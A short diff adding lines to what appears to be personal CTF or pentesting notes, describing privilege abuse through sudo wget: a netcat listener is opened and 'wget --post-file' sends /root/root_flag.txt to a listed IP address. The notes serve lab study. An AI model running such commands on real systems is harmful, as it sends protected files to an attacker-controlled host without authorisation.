@@ -534,3 +534,15 @@ only if docker.sock has a sticky bit!!
 curl IP/.well-known/security.txt
 
 -->file with security info about reporting bugs etc.
+
+<br />
+<br />
+
+
+priv esc using wget
+
+sudo nc -lvpn 80
+
+sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.11.30.36 
+
+shows content of file in another terminal with netcat
